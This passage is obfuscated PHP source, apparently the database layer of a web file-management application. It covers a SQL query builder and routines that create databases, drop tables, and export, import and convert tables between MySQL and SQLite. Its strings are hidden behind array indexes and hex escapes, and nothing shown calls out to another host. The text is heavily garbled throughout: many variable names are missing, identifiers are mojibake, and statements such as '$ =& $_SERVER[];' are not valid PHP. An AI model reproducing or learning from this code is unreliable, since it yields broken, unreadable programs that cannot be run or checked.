(!preg_match($—ó‹Ç[1037], $)) { think_exception($—ó‹Ç[1038] . $); } return $; } protected function parseValue($„èè√ø) { $Í†≠ =& $_SERVER[]; if (is_string($„èè√ø)) { $„èè√ø = $Í†≠[998] . $this->escapeString($„èè√ø) . $Í†≠[998]; } elseif (isset($„èè√ø[0]) && is_string($„èè√ø[0]) && strtolower($„èè√ø[0]) == $Í†≠[350]) { $„èè√ø = $this->escapeString($„èè√ø[1]); } elseif (is_array($„èè√ø)) { $„èè√ø = array_map(array($this, $Í†≠[999]), $„èè√ø); } elseif (is_bool($„èè√ø)) { $„èè√ø = $„èè√ø ? $Í†≠[98] : $Í†≠[222]; } elseif (is_null($„èè√ø)) { $„èè√ø = $Í†≠[113]; } return $„èè√ø; } protected function parseField($÷¢) { $–¨ =& $_SERVER[]; if (is_string($÷¢) && strpos($÷¢, $–¨[60])) { $÷¢ = explode($–¨[60], $÷¢); } if (is_array($÷¢)) { $Õó = array(); foreach ($÷¢ as $ => $) { if (!is_numeric($)) { $Õó[] = $this->parseKey($, !1) . $–¨[1039] . $this->parseKey($); } else { $Õó[] = $this->parseKey($); } } $ = implode($–¨[60], $Õó); } elseif (is_string($÷¢) && !empty($÷¢)) { $ = $÷¢; } else { $ = $–¨[213]; } return $; } protected function parseTable($) { $ =& $_SERVER[]; if (is_array($)) { $‚ãâ = array(); foreach ($ as $€ú => $) { if (!is_numeric($€ú)) { $‚ãâ[] = $this->parseKey($€ú) . $[63] . $this->parseKey($); } else { $‚ãâ[] = $this->parseKey($€ú); } } $ = $‚ãâ; } elseif (is_string($)) { if (strstr($, $[63])) { return $; } $ = explode($[60], $); array_walk($, array($this, $[947])); } return $[941] . trim(implode($[1040], $), $[438]) . $[941]; } protected function parseWhere($€§) { $Ïêî =& $_SERVER[]; $ = $Ïêî[22]; if (is_string($€§)) { $ = $€§; } else { $Òçô• = isset($€§[$Ïêî[1041]]) ? strtoupper($€§[$Ïêî[1041]]) : $Ïêî[22]; if (in_array($Òçô•, array($Ïêî[1042], $Ïêî[1043], $Ïêî[1044]))) { $Òçô• = $Ïêî[63] . $Òçô• . $Ïêî[63]; unset($€§[$Ïêî[1041]]); } else { $Òçô• = $Ïêî[1045]; } foreach ($€§ as $–¨ => $) { $ .= $Ïêî[330]; if (is_numeric($–¨)) { $–¨ = $Ïêî[1046]; } if (0 === strpos($–¨, $Ïêî[21])) { $ .= $this->parseThinkWhere($–¨, $); } else { if (!preg_match($Ïêî[1047], trim($–¨))) { think_exception(think_lang($Ïêî[1048]) . $Ïêî[4] . $–¨); } $ = is_array($) && isset($[$Ïêî[1049]]); $–¨ = trim($–¨); if (strpos($–¨, $Ïêî[336])) { $ = explode($Ïêî[336], $–¨); $ = array(); foreach ($ as $ => $ﬂê—ì) { $—ñ = $ ? $[$] : $; $[] = $Ïêî[313] . $this->parseWhereItem($this->parseKey($ﬂê—ì), $—ñ) . $Ïêî[946]; } $ .= implode($Ïêî[1050], $); } elseif (strpos($–¨, $Ïêî[337])) { $ = explode($Ïêî[337], $–¨); $ = array(); foreach ($ as $ => $ﬂê—ì) { $—ñ = $ ? $[$] : $; $[] = $Ïêî[313] . $this->parseWhereItem($this->parseKey($ﬂê—ì), $—ñ) . $Ïêî[946]; } $ .= implode($Ïêî[1045], $); } else { $ .= $this->parseWhereItem($this->parseKey($–¨), $); } } $ .= $Ïêî[331] . $Òçô•; } $ = substr($, 0, -strlen($Òçô•)); } return empty($) ? $Ïêî[22] : $Ïêî[1051] . $; } protected function parseWhereItem($—¥Î∂µ, $€≤) { $—î‘ô =& $_SERVER[]; $ƒë = $—î‘ô[22]; if (is_array($€≤)) { if (is_string($€≤[0])) { $–ú = strtolower($€≤[0]); if (in_array($€≤[0], array($—î‘ô[925], $—î‘ô[1052], $—î‘ô[1053], $—î‘ô[1054], $—î‘ô[1055], $—î‘ô[1056]))) { $ƒë .= $—¥Î∂µ . $—î‘ô[63] . $€≤[0] . $—î‘ô[63] . $this->parseValue($€≤[1]); } elseif (preg_match($—î‘ô[1057], $€≤[0])) { $ƒë .= $—¥Î∂µ . $—î‘ô[63] . $this->exp[$–ú] . $—î‘ô[63] . $this->parseValue($€≤[1]); } elseif (preg_match($—î‘ô[1058], $€≤[0])) { if (is_array($€≤[1])) { $⁄™ = isset($€≤[2]) ? strtoupper($€≤[2]) : $—î‘ô[1043]; if (in_array($⁄™, array($—î‘ô[1042], $—î‘ô[1043], $—î‘ô[1044]))) { $∆Ä = array(); foreach ($€≤[1] as $Ãõ) { $∆Ä[] = $—¥Î∂µ . $—î‘ô[63] . $this->exp[$–ú] . $—î‘ô[63] . $this->parseValue($Ãõ); } $ƒë .= $—î‘ô[313] . implode($—î‘ô[63] . $⁄™ . $—î‘ô[63], $∆Ä) . $—î‘ô[946]; } } else { $ƒë .= $—¥Î∂µ . $—î‘ô[63] . $this->exp[$–ú] . $—î‘ô[63] . $this->parseValue($€≤[1]); } } elseif ($—î‘ô[350] == $–ú) { $ƒë .= $—î‘ô[944] . $—¥Î∂µ . $—î‘ô[63] . $€≤[1] . $—î‘ô[1059]; } elseif (preg_match($—î‘ô[1060], $€≤[0])) { $ƒë .= $€≤[0]; } elseif (preg_match($—î‘ô[1061], $€≤[0])) { if (isset($€≤[2]) && $—î‘ô[350] == $€≤[2]) { $ƒë .= $—¥Î∂µ . $—î‘ô[63] . $this->exp[$–ú] . $—î‘ô[63] . $€≤[1]; } else { if (is_string($€≤[1])) { $€≤[1] = explode($—î‘ô[60], $€≤[1]); } $ = implode($—î‘ô[60], $this->parseValue($€≤[1])); $ƒë .= $—¥Î∂µ . $—î‘ô[63] . $this->exp[$–ú] . $—î‘ô[944] . $ . $—î‘ô[946]; } } elseif (preg_match($—î‘ô[1062], $€≤[0])) { $ = is_string($€≤[1]) ? explode($—î‘ô[60], $€≤[1]) : $€≤[1]; $ƒë .= $—î‘ô[944] . $—¥Î∂µ . $—î‘ô[63] . $this->exp[$–ú] . $—î‘ô[63] . $this->parseValue($[0]) . $—î‘ô[1045] . $this->parseValue($[1]) . $—î‘ô[331]; } else { think_exception(think_lang($—î‘ô[1048]) . $—î‘ô[4] . $€≤[0]); } } else { $Íò• = count($€≤); $÷∫ = $—î‘ô[22]; if (is_string($€≤[$Íò• - 1])) { $÷∫ = isset($€≤[$Íò• - 1]) ? strtoupper($€≤[$Íò• - 1]) : $—î‘ô[22]; if (in_array($÷∫, array($—î‘ô[1042], $—î‘ô[1043], $—î‘ô[1044]))) { $Íò• = $Íò• - 1; } } else { $÷∫ = $—î‘ô[1042]; } for ($«ä…í€É = 0; $«ä…í€É < $Íò•; $«ä…í€É++) { $ = is_array($€≤[$«ä…í€É]) ? $€≤[$«ä…í€É][1] : $€≤[$«ä…í€É]; if ($—î‘ô[350] == strtolower($€≤[$«ä…í€É][0])) { $ƒë .= $—î‘ô[313] . $—¥Î∂µ . $—î‘ô[63] . $ . $—î‘ô[1059] . $÷∫ . $—î‘ô[63]; } else { $Á®í = is_array($€≤[$«ä…í€É]) ? $this->exp[strtolower($€≤[$«ä…í€É][0])] : $—î‘ô[925]; if (!$Á®í && is_array($€≤[$«ä…í€É]) && in_array($€≤[$«ä…í€É][0], array($—î‘ô[925], $—î‘ô[1052], $—î‘ô[1053], $—î‘ô[1054], $—î‘ô[1055], $—î‘ô[1056]))) { $Á®í = $€≤[$«ä…í€É][0]; } $ƒë .= $—î‘ô[313] . $—¥Î∂µ . $—î‘ô[63] . $Á®í . $—î‘ô[63] . $this->parseValue($) . $—î‘ô[1059] . $÷∫ . $—î‘ô[63]; } } $ƒë = substr($ƒë, 0, -4); } } else { $ƒë .= $—¥Î∂µ . $—î‘ô[1063] . $this->parseValue($€≤); } return $ƒë; } protected function parseThinkWhere($, $∆Ñ) { $ =& $_SERVER[]; $ = $[22]; switch ($) { case $[405]: $ = $∆Ñ; break; case $[1046]: $ = is_string($∆Ñ) ? $∆Ñ : substr($this->parseWhere($∆Ñ), 6); break; case $[1064]: parse_str($∆Ñ, $); if (isset($[$[1041]])) { $ = $[63] . strtoupper($[$[1041]]) . $[63]; unset($[$[1041]]); } else { $ = $[1045]; } $ = array(); foreach ($ as $ => $) { $[] = $this->parseKey($) . $[1063] . $this->parseValue($); } $ = implode($, $); break; } return $; } protected function parseLimit($Â≤≥Ã¨) { $ =& $_SERVER[]; return !empty($Â≤≥Ã¨) ? $[61] . $Â≤≥Ã¨ . $[63] : $[22]; } protected function parseJoin($) { $ =& $_SERVER[]; $ = $[22]; if (!empty($)) { if (is_array($)) { foreach ($ as $Ï±± => $Ÿç) { if (!1 !== stripos($Ÿç, $[1065])) { $ .= $[63] . $Ÿç; } else { $ .= $[1066] . $Ÿç; } } } else { $ .= $[1066] . $; } } $ = preg_replace($[1067], think_config($[971]) . $[1068], $); return $; } protected function parseOrder($œª) { $ ã =& $_SERVER[]; if (is_array($œª)) { $ = array(); foreach ($œª as $È∑É => $Èª©) { if (is_numeric($È∑É)) { $[] = $this->parseKey($Èª©); } else { $Èª© = in_array(strtoupper(trim($Èª©)), array($ ã[1069], $ ã[1070])) ? $ ã[63] . $Èª© : $ ã[22]; if (preg_match($ ã[1071], $È∑É)) { $[] = $this->parseKey($È∑É) . $Èª©; } else { think_exception($ ã[1072] . $È∑É); } } } $œª = implode($ ã[60], $); } return !empty($œª) ? $ ã[1073] . $œª : $ ã[22]; } protected function parseGroup($›Ω) { $ƒã»û =& $_SERVER[]; return !empty($›Ω) ? $ƒã»û[1074] . $›Ω : $ƒã»û[22]; } protected function parseHaving($›∏) { $ =& $_SERVER[]; return !empty($›∏) ? $[1075] . $›∏ : $[22]; } protected function parseComment($—™Õº) { $Óâå =& $_SERVER[]; return !empty($—™Õº) ? $Óâå[1076] . $—™Õº . $Óâå[1077] : $Óâå[22]; } protected function parseDistinct($»ç) { $’° =& $_SERVER[]; return !empty($»ç) ? $’°[1078] : $’°[22]; } protected function parseUnion($) { $Ãáÿë =& $_SERVER[]; if (empty($)) { return $Ãáÿë[22]; } if (isset($[$Ãáÿë[401]])) { $›µ = $Ãáÿë[1079]; unset($[$Ãáÿë[401]]); } else { $›µ = $Ãáÿë[1080]; } foreach ($ as $”ø) { $ÿÇ€∏[] = $›µ . (is_array($”ø) ? $this->buildSelectSql($”ø) : $”ø); } return implode($Ãáÿë[63], $ÿÇ€∏); } public function insert($, $ = array(), $ = false) { $«¶ =& $_SERVER[]; $ÿ¢ = $Õ™„íë = array(); $this->model = $[$«¶[334]]; foreach ($ as $ => $»æ√∏∆Ω) { if (is_array($»æ√∏∆Ω) && $«¶[350] == $»æ√∏∆Ω[0]) { $Õ™„íë[] = $this->parseKey($); $ÿ¢[] = $»æ√∏∆Ω[1]; } elseif (is_scalar($»æ√∏∆Ω) || is_null($»æ√∏∆Ω)) { $Õ™„íë[] = $this->parseKey($); $ÿ¢[] = $this->parseValue($»æ√∏∆Ω); } } $ﬂ∞ = ($ ? $«¶[948] : $«¶[949]) . $«¶[950] . $this->parseTable($[$«¶[332]]) . $«¶[944] . implode($«¶[60], $Õ™„íë) . $«¶[945] . implode($«¶[60], $ÿ¢) . $«¶[946]; $ﬂ∞ .= $this->parseLock(isset($[$«¶[884]]) ? $[$«¶[884]] : !1); $ﬂ∞ .= $this->parseComment(!empty($[$«¶[407]]) ? $[$«¶[407]] : $«¶[22]); return $this->execute($ﬂ∞, $this->parseBind(!empty($[$«¶[338]]) ? $[$«¶[338]] : array())); } public function selectInsert($Ã£, $, $ = array()) { $ =& $_SERVER[]; $this->model = $[$[334]]; if (is_string($Ã£)) { $Ã£ = explode($[60], $Ã£); } array_walk($Ã£, array($this, $[947])); $ = $[1081] . $this->parseTable($) . $[944] . implode($[60], $Ã£) . $[1059]; $ .= $this->buildSelectSql($); return $this->execute($, $this->parseBind(!empty($[$[338]]) ? $[$[338]] : array())); } public function update($ƒÆ, $ﬁÅ) { $ﬁÉ =& $_SERVER[]; $this->model = $ﬁÅ[$ﬁÉ[334]]; $ = $ﬁÉ[1082] . $this->parseTable($ﬁÅ[$ﬁÉ[332]]) . $this->parseSet($ƒÆ) . $this->parseWhere(!empty($ﬁÅ[$ﬁÉ[328]]) ? $ﬁÅ[$ﬁÉ[328]] : $ﬁÉ[22]) . $this->parseOrder(!empty($ﬁÅ[$ﬁÉ[418]]) ? $ﬁÅ[$ﬁÉ[418]] : $ﬁÉ[22]) . $this->parseLimit(!empty($ﬁÅ[$ﬁÉ[345]]) ? $ﬁÅ[$ﬁÉ[345]] : $ﬁÉ[22]) . $this->parseLock(isset($ﬁÅ[$ﬁÉ[884]]) ? $ﬁÅ[$ﬁÉ[884]] : !1) . $this->parseComment(!empty($ﬁÅ[$ﬁÉ[407]]) ? $ﬁÅ[$ﬁÉ[407]] : $ﬁÉ[22]); return $this->execute($, $this->parseBind(!empty($ﬁÅ[$ﬁÉ[338]]) ? $ﬁÅ[$ﬁÉ[338]] : array())); } public function delete($«Ä = array()) { $⁄∞ =& $_SERVER[]; $this->model = $«Ä[$⁄∞[334]]; $ = $⁄∞[1083] . $this->parseTable($«Ä[$⁄∞[332]]) . $this->parseWhere(!empty($«Ä[$⁄∞[328]]) ? $«Ä[$⁄∞[328]] : $⁄∞[22]) . $this->parseOrder(!empty($«Ä[$⁄∞[418]]) ? $«Ä[$⁄∞[418]] : $⁄∞[22]) . $this->parseLimit(!empty($«Ä[$⁄∞[345]]) ? $«Ä[$⁄∞[345]] : $⁄∞[22]) . $this->parseLock(isset($«Ä[$⁄∞[884]]) ? $«Ä[$⁄∞[884]] : !1) . $this->parseComment(!empty($«Ä[$⁄∞[407]]) ? $«Ä[$⁄∞[407]] : $⁄∞[22]); return $this->execute($, $this->parseBind(!empty($«Ä[$⁄∞[338]]) ? $«Ä[$⁄∞[338]] : array())); } public function select($ = array()) { $›Å =& $_SERVER[]; $this->model = $[$›Å[334]]; $¬ç = $this->buildSelectSql($); $‹∫ÿ© = isset($[$›Å[402]]) ? $[$›Å[402]] : !1; if ($‹∫ÿ©) { $—Ä = is_string($‹∫ÿ©[$›Å[104]]) ? $‹∫ÿ©[$›Å[104]] : $›Å[1084] . md5($¬ç); $›π = think_cache($—Ä, $›Å[22], $‹∫ÿ©); if (!1 !== $›π) { return $›π; } } $œπ’æ = $this->query($¬ç, $this->parseBind(!empty($[$›Å[338]]) ? $[$›Å[338]] : array())); if ($‹∫ÿ© && !1 !== $œπ’æ) { think_cache($—Ä, $œπ’æ, $‹∫ÿ©); } return $œπ’æ; } public function buildSelectSql($ = array()) { $ =& $_SERVER[]; if (isset($[$[406]])) { if (strpos($[$[406]], $[60])) { list($ ∑, $) = explode($[60], $[$[406]]); } else { $ ∑ = $[$[406]]; } $ ∑ = $ ∑ ? $ ∑ : 1; $ = isset($) ? $ : (is_numeric($[$[345]]) ? $[$[345]] : 20); $ŒÑ = $ * ((int) $ ∑ - 1); $[$[345]] = $ŒÑ . $[60] . $; } if (think_config($[1085])) { $ = $[1086] . md5(serialize($)); $»ª = think_cache($); if ($»ª) { return $»ª; } } $ = $this->parseSql($this->selectSql, $); $ .= $this->parseLock(isset($[$[884]]) ? $[$[884]] : !1); if (isset($)) { think_cache($, $); } return $; } public function parseSql($¬´, $ = array()) { $ è =& $_SERVER[]; $¬´ = str_replace(array($ è[1087], $ è[1088], $ è[1089], $ è[1090], $ è[1091], $ è[1092], $ è[1093], $ è[1094], $ è[1095], $ è[1096], $ è[1097]), array($this->parseTable("{$[$ è[332]]}"), $this->parseDistinct(isset($[$ è[1098]]) ? $[$ è[1098]] : !1), $this->parseField(!empty($[$ è[326]]) ? $[$ è[326]] : $ è[213]), $this->parseJoin(!empty($[$ è[335]]) ? $[$ è[335]] : $ è[22]), $this->parseWhere(!empty($[$ è[328]]) ? $[$ è[328]] : $ è[22]), $this->parseGroup(!empty($[$ è[556]]) ? $[$ è[556]] : $ è[22]), $this->parseHaving(!empty($[$ è[1099]]) ? $[$ è[1099]] : $ è[22]), $this->parseOrder(!empty($[$ è[418]]) ? $[$ è[418]] : $ è[22]), $this->parseLimit(!empty($[$ è[345]]) ? $[$ è[345]] : $ è[22]), $this->parseUnion(!empty($[$ è[400]]) ? $[$ è[400]] : $ è[22]), $this->parseComment(!empty($[$ è[407]]) ? $[$ è[407]] : $ è[22])), $¬´); return $¬´; } public function getLastSql($ = '') { return $ ? $this->modelSql[$] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($) { return addslashes($); } public function setModel($Ë©Ç) { $this->model = $Ë©Ç; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($ = array()) { $—´ =& $_SERVER[]; if (empty($)) { $ = $GLOBALS[$—´[16]][$—´[31]]; } $this->database = $; } public function model($«§ = '') { return new ModelBase($«§, $_SERVER[][22], $this->database); } public function db($ = false) { $ =& $_SERVER[]; $€∂ = array_change_key_case($this->database); if ($this->dbType() == $[23] || !$) { return $this->model()->db(); } $ = $€∂[$[1013]]; $€∂[$[1013]] = $[22]; if ($€∂[$[1008]] == $[1005]) { $ = $€∂[$[1014]]; $€∂[$[1014]] = substr($, 0, strrpos($, $[1100])); } $this->database = $€∂; $≈êﬂé = $this->model()->db(); try { $ = $≈êﬂé->execute("\x73\x68\x6f\x77\40\x64\141\x74\141\x62\141\163\145\163\x20\x6c\x69\x6b\x65\40\47{$}\x27"); } catch (Exception $‹®) { } if (!$) { $≈êﬂé->execute("\x63\162\145\141\x74\x65\40\144\141\x74\141\x62\141\x73\x65\x20\140{$}\140"); } $€∂[$[1013]] = $; if ($€∂[$[1008]] == $[1005]) { $€∂[$[1014]] .= $[1100] . $; } $this->database = $€∂; $≈êﬂé->execute("\165\x73\x65\x20\x60{$}\x60"); return $≈êﬂé; } public function createTable($œá, &$–¥) { $÷ë =& $_SERVER[]; if (!IO::exist($œá)) { ActionCall($÷ë[1101], !0, 0); show_json(LNG($÷ë[1102]), !1); } $Ÿ± = $this->model()->db(); $ÚÄäÆ = sqlSplit(IO::getContent($œá)); foreach ($ÚÄäÆ as $‰†ó) { $√§ = stripos($‰†ó, $÷ë[1103]) === 0; if ($√§) { $–¥->task[$÷ë[826]] += 1; } $Ÿ±->execute($‰†ó); if ($√§) { preg_match($÷ë[1104], $‰†ó, $Íúã); $–¥->task[$÷ë[1105]] = $Íúã[1]; $–¥->update(1); } } } public function insertTable($, &$—ö) { $Ìùë =& $_SERVER[]; $ = $this->model()->db(); $ = $ ? array($) : $->getTables(); foreach ($ as $) { $ = basename($, $Ìùë[828]); if (!in_array($, $)) { continue; } $—ö->task[$Ìùë[1105]] = $; if (get_filesize($) == 0) { continue; } $≈ÉÕò = $this->sqlToDb($, $—ö); if (!$≈ÉÕò) { ActionCall($Ìùë[1101], !0, 0); show_json(LNG($Ìùë[1106]) . "\x5b{$}\x5d", !1); } } } public function sqlFromDb($’≥, $÷Ø, &$“æ, $¬Ö = '') { if ($“æ) { $“æ->task[$_SERVER[][1105]] = $’≥; } $ÎÆò = $this->model($’≥); $ÍüØ = 0; $Âåì = 0; $ = 10000; $—à = fopen($÷Ø, $_SERVER[][1107]); $ƒ∫ = $ÎÆò->getPk(); $”Æ = $ÎÆò->getDbFields(); $“¢ = $_SERVER[][22]; if ($GLOBALS[$_SERVER[][827]] && in_array($’≥, array($_SERVER[][1108], $_SERVER[][1109]))) { $“¢ = $’≥; } do { $€¥Ÿî = array($ƒ∫ => array($_SERVER[][1055], $Âåì)); $ƒÅ = $ÎÆò->where($€¥Ÿî)->field($”Æ)->order($ƒ∫ . $_SERVER[][1110])->limit($)->select(); $ƒÅ = !empty($ƒÅ) ? $ƒÅ : array(); if (!($ = count($ƒÅ))) { break; } $ = end($ƒÅ); $Âåì = $[$ƒ∫]; $’ß = array(); foreach ($ƒÅ as $) { if ($“¢) { if ($’≥ == $_SERVER[][1108]) { if ($[$_SERVER[][43]] == $_SERVER[][1111]) { $‰ëç = json_decode($[$_SERVER[][427]], !0); if ($‰ëç[$_SERVER[][42]] == $GLOBALS[$_SERVER[][827]] && $‰ëç[$_SERVER[][790]] != 1) { continue; } } } else { if ($[$_SERVER[][43]] == $_SERVER[][1112] && $[$_SERVER[][104]] == $_SERVER[][819]) { continue; } } } if ($¬Ö) { $[$_SERVER[][94]] = "\x7b\x69\x6f\72{$¬Ö}\x7d" . substr($[$_SERVER[][94]], strlen("\x7b\x69\x6f\72{$[$_SERVER[][857]]}\175")); $[$_SERVER[][857]] = $¬Ö; } $’ß[] = $_SERVER[][1113] . $this->sqlEncode($) . $_SERVER[][1114]; } $ƒò = "\111\116\x53\x45\122\124\40\x49\x4e\124\x4f\40\x60{$’≥}\x60\40\50\x60" . implode($_SERVER[][1115], $”Æ) . $_SERVER[][1116]; fwrite($—à, $ƒò . implode($_SERVER[][1117], $’ß) . $_SERVER[][81] . PHP_EOL); $ÍüØ += $; if ($“æ) { $“æ->update($); } } while ($ == $); fclose($—à); return $ÍüØ; } public function sqlToDb($‘ß, &$»ú) { $ =& $_SERVER[]; $ƒàƒ• = $this->model()->db(); $œê‚áÇ = @fopen($‘ß, $[1118]); if (!$œê‚áÇ) { return !1; } $ƒç = 0; $ﬁ≤ = $[22]; $€≤ = array(); $ = $this->dbType(); $Áô¢ = $ == $[23] ? 500 : 2000; $’î = basename($‘ß, $[828]); $ = 0; $…û = 4194304 - 104858; $√£ = 1000000 - 104858; while (!feof($œê‚áÇ)) { $€• = trim(fgets($œê‚áÇ)); if (!$€•) { continue; } $—º = $this->sqlDecode($€•, $, $’î); if (stripos($—º, $[408]) === 0) { if (!$ﬁ≤) { $ﬁ≤ = $—º . $[63]; } continue; } if ($»ú) { $»ú->task[$[826]] += 1; } $ƒç++; $€≤[] = rtrim(rtrim(trim($—º), $[60]), $[81]); $ = null; $ = strlen($—º); $ += $; if ($ >= ($Áô¢ == 500 ? $√£ : $…û)) { $ = array_pop($€≤); if ($ƒç > 1) { $ƒç--; } } if ($ƒç >= $Áô¢ || $) { $—º = $ﬁ≤ . implode($[60], $€≤); if (!$ƒàƒ•->execute($—º)) { return !1; } if ($»ú) { $»ú->update($ƒç); } $€≤ = array(); $ƒç = 0; $ = 0; if ($) { $€≤ = array($); $ƒç = 1; $ = $; } } } fclose($œê‚áÇ); if (!empty($€≤)) { $—º = $ﬁ≤ . implode($[60], $€≤); if (!$ƒàƒ•->execute($—º)) { return !1; } if ($»ú) { $»ú->update($ƒç); } } return !0; } public function dropTable($ÕÇ = null) { $ = $this->model()->db(); $ = $ÕÇ ? array($ÕÇ) : $->getTables(); if (!$) { return; } foreach ($ as $ÕÇ) { if ($ÕÇ) { $ÕÇ = strtolower($ÕÇ); } else { continue; } $->execute("\x64\x72\157\x70\40\164\141\x62\154\145\x20\151\x66\x20\145\x78\151\x73\x74\163\x20\x60{$ÕÇ}\140"); } } private function sqlEncode($…ñ) { $ =& $_SERVER[]; $ = array(); foreach ($…ñ as $Ìè∂) { if (is_array($Ìè∂)) { $Ìè∂ = json_encode_force($Ìè∂); } $Ìè∂ = addslashes($Ìè∂); $Ìè∂ = str_replace(array($[1119], $[11]), array($[1120], $[1121]), $Ìè∂); $[] = str_replace($[68], $[1122], $Ìè∂); } return $[68] . implode($[1123], $) . $[68]; } private function sqlDecode($, $, $ = '') { $ =& $_SERVER[]; $ = str_replace(array($[1120], $[1121]), array($[1119], $[11]), $); if ($ == $[23]) { return $ != $[1124] ? stripslashes($) : $; } if ($ == $[1124]) { $ = str_replace($[1125], $[128], stripslashes($)); } return $; } public function getSqlFile($»≤ = '') { $ =& $_SERVER[]; $’Æ = $this->dbType(!0); $ = CONTROLLER_DIR . "\x69\x6e\163\164\141\x6c\x6c\x2f\144\141\x74\141\57{$’Æ}\56\163\161\x6c"; $ = file_get_contents($); $›¥ = $[1126] . ($’Æ == $[844] ? $[1127] : $[1128]) . $[1129]; preg_match_all($›¥, $, $); $ = $[1]; $ﬁÅ = $this->model()->db(); $€∞ = $ﬁÅ->getTables(); $ = TEMP_FILES . $[1130] . date($[264]) . $[18]; del_dir($); mk_dir($); $ = $ . $[1131]; $ = $ . $[1132]; $Êìö = $’Æ == $[23] ? $[844] : $[23]; IO::copy(CONTROLLER_DIR . "\151\x6e\163\164\141\x6c\x6c\x2f\x64\141\x74\141\x2f{$Êìö}\x2e\x73\x71\x6c", $); @touch($ . $’Æ . $[828]); $ÕÄ = fopen($, $[1107]); $÷¢ = fopen($, $[1107]); if ($’Æ == $[23]) { $€∞ = array_diff($€∞, array($[824], $[825])); $ÿÖ = array($[1133], $[1134], $[1135]); fwrite($÷¢, implode(PHP_EOL, $ÿÖ) . PHP_EOL . PHP_EOL); foreach ($€∞ as $√¨) { $ = $this->sqlFromSqlite($√¨); if (!$[$[23]]) { continue; } fwrite($÷¢, $[$[23]] . PHP_EOL . PHP_EOL); if (!in_array($√¨, $)) { fwrite($ÕÄ, $[$[844]] . PHP_EOL . PHP_EOL); } } } else { foreach ($€∞ as $√¨) { $ = $this->sqlFromMysql($√¨); if (!$[$[844]]) { continue; } fwrite($ÕÄ, $[$[844]] . PHP_EOL . PHP_EOL); if (!in_array($√¨, $)) { fwrite($÷¢, $[$[23]] . PHP_EOL . PHP_EOL); } } } fclose($ÕÄ); fclose($÷¢); $ = array($[844] => $, $[23] => $); return $»≤ ? $[$»≤] : $; } public function dbType($ = false) { $’≤ =& $_SERVER[]; $Ê±† = $ ? $GLOBALS[$’≤[16]][$’≤[31]] : $this->database; $Ê±† = array_change_key_case($Ê±†); $ = $Ê±†[$’≤[1008]]; if ($ == $’≤[1005]) { $€Æ = explode($’≤[4], $Ê±†[$’≤[1014]]); $ = $€Æ[0]; } $ = array($’≤[1136] => $’≤[23], $’≤[953] => $’≤[844]); if (isset($[$])) { $ = $[$]; } return $; } public function sqlFromMysql($, $ = '') { $ƒ∫ =& $_SERVER[]; $–è—Ø = $this->model()->db(); $ = $–è—Ø->query($ƒ∫[1137] . $ . $ƒ∫[438]); if (!$ || !$[0]) { return !1; } $ = _get($[0], $ƒ∫[1138], $ƒ∫[22]); if (!$) { return !1; } $√û = "\x44\122\117\120\40\x54\x41\102\114\105\40\111\x46\x20\x45\130\111\x53\x54\x53\40\x60{$}\140\x3b" . PHP_EOL . $ . $ƒ∫[81]; if ($ && $ == $ƒ∫[844]) { return $√û; } $ = array_change_key_case($GLOBALS[$ƒ∫[16]][$ƒ∫[31]]); $œ∞ = $[$ƒ∫[1013]]; $ = $ƒ∫[1139] . $œ∞ . $ƒ∫[1140] . $ . $ƒ∫[68]; $ = $ƒ∫[1141] . $ . $ƒ∫[941]; $ = $–è—Ø->query($); if (empty($)) { $…ü ¥ = array($ƒ∫[844] => $ƒ∫[22], $ƒ∫[23] => $ƒ∫[22]); return $ ? $…ü ¥[$] : $…ü ¥; } $≈Çﬁ† = $–è—Ø->query($); $Ë®∫ = $ƒ∫[22]; $’ñ = array(); foreach ($≈Çﬁ† as $) { if (!$Ë®∫ && $[$ƒ∫[1142]] == $ƒ∫[1143]) { $Ë®∫ = $[$ƒ∫[1144]]; } if (isset($’ñ[$[$ƒ∫[1142]]])) { $’ñ[$[$ƒ∫[1142]]][$ƒ∫[1145]][] = $[$ƒ∫[1144]]; continue; } $’ñ[$[$ƒ∫[1142]]] = array($ƒ∫[1146] => $[$ƒ∫[1142]], $ƒ∫[1145] => array($[$ƒ∫[1144]]), $ƒ∫[1147] => $[$ƒ∫[1148]] == $ƒ∫[98] ? 0 : 1); } $—ò = array(); foreach ($’ñ as $) { $¬Ω = $[$ƒ∫[1146]] == $ƒ∫[1143]; $ = array($ƒ∫[1149], $[$ƒ∫[1147]] == $ƒ∫[98] && !$¬Ω ? $ƒ∫[1150] : $ƒ∫[22], $ƒ∫[1151], $ƒ∫[1152] . $ . $ƒ∫[21] . ($¬Ω ? $ƒ∫[1153] : $[$ƒ∫[1146]]) . $ƒ∫[128], $ƒ∫[1154], $ƒ∫[128] . $ . $ƒ∫[128], $ƒ∫[1155] . implode($ƒ∫[1156], $[$ƒ∫[1145]]) . $ƒ∫[1157]); $—ò[] = implode($ƒ∫[63], $) . $ƒ∫[81]; } $»öÔ¢ö = array(); $¬Ø = array($ƒ∫[1158] => $ƒ∫[1159], $ƒ∫[1159] => $ƒ∫[1159], $ƒ∫[341] => $ƒ∫[368], $ƒ∫[340] => $ƒ∫[368]); foreach ($ as $) { $ = array($ƒ∫[128] . $[$ƒ∫[1160]] . $ƒ∫[128], isset($¬Ø[$[$ƒ∫[1161]]]) ? $¬Ø[$[$ƒ∫[1161]]] : $[$ƒ∫[1162]], $[$ƒ∫[1163]] == $ƒ∫[939] ? $ƒ∫[1164] : $ƒ∫[1165], $[$ƒ∫[1160]] == $Ë®∫ ? $ƒ∫[1166] : $ƒ∫[22], $[$ƒ∫[990]] ? strtoupper(str_replace($ƒ∫[21], $ƒ∫[22], $[$ƒ∫[990]])) : $ƒ∫[22]); $»öÔ¢ö[] = trim(implode($ƒ∫[63], $)); } $€é = array($ƒ∫[1167] . $ . $ƒ∫[1168], $ƒ∫[1169] . $ . $ƒ∫[1170], implode($ƒ∫[60] . PHP_EOL, $»öÔ¢ö), $ƒ∫[987]); $Êãâ = implode(PHP_EOL, array_merge($€é, $—ò)); if ($ && $ == $ƒ∫[23]) { return $Êãâ; } $…ü ¥ = array($ƒ∫[844] => $√û, $ƒ∫[23] => $Êãâ); return $ ? $…ü ¥[$] : $…ü ¥; } public function sqlFromSqlite($Œº, $”ßÃ° = '') { $…à =& $_SERVER[]; $ = $this->model()->db(); $ = "\x50\122\x41\107\115\x41\x20\x54\x41\x42\x4c\105\x5f\x49\x4e\106\117\40\x28\47{$Œº}\x27\x29"; $ﬂ´ = 